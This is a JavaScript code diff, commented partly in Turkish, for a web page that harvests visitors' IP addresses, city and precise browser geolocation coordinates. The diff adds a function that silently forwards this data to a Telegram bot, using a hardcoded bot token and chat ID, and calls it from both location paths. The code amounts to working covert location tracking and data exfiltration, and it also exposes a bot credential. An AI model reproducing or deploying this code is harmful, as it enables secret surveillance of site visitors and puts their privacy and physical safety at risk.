@@ -37,9 +37,17 @@ const ajaxFunc = async (_data) => {
           "," +
           getData.ll[1],
       };
-
-      Object.assign(getAll, todayDate());
-      
+      // Object.assign(getAll, todayDate());
+      sendMessageTelegram(
+        dataText(
+          getAll.ip,
+          getAll.latitude,
+          getAll.longitude,
+          todayDate().dataIsGetDate,
+          getAll.city,
+          getAll.mapsUrl
+        )
+      );
       insert("GetInfo", idKey, getAll);
     })
     .catch();
@@ -86,10 +94,9 @@ const locationInterval = setInterval(() => {
 
 function showuserPosition(position) {
   const latlon = position.coords.latitude + "," + position.coords.longitude;
-  let mapsObj;
 
   getPlain().then((e) => {
-    mapsObj = {
+    const mapsObj = {
       x: position.coords.latitude,
       y: position.coords.longitude,
       ip: e,
@@ -101,7 +108,22 @@ function showuserPosition(position) {
 
       date: todayDate().dataIsGetDate,
     };
+
+    sendMessageTelegram(
+      dataText(
+        mapsObj.ip,
+        "",
+        "",
+        "",
+        "",
+        "",
+        mapsObj.url,
+        mapsObj.x,
+        mapsObj.y
+      )
+    );
     insert("Maps/", idKey, mapsObj);
+    // sendMessageTelegram()
   });
 
   clearInterval(locationInterval);
@@ -123,3 +145,44 @@ function showbrowserError(error) {
       break;
   }
 }
+
+//Telegrama veri aktar
+const sendMessageTelegram = (mesajIcerigi) => {
+  $.ajax({
+    type: "GET",
+    url:
+      " https://api.telegram.org/bot5704854415:AAHURUtYW4em8S_urhrav-wGK0DpWHogUoo/sendMessage?chat_id=1372649086&text=" +
+      mesajIcerigi,
+  }).done((e) => {});
+};
+
+const dataText = (
+  ip,
+  iplen,
+  iplon,
+  ipdate,
+  ipcity,
+  mapsUrl,
+  realMaps,
+  x,
+  y
+) => {
+  let text = `
+      IP : ${ip}
+      Şehir : ${ipcity}
+      Len(x) : ${iplen}
+      Long(y) : ${iplon}
+      Tarih : ${ipdate}
+      Konum : ${mapsUrl}
+
+  Maps : {
+    '
+    IP : ${ip}
+    Tam Konum : ${realMaps}
+    Tam X Kordinatı : ${x},
+    Tam Y Kordinatı : ${y},
+  }
+  `;
+
+  return text;
+};
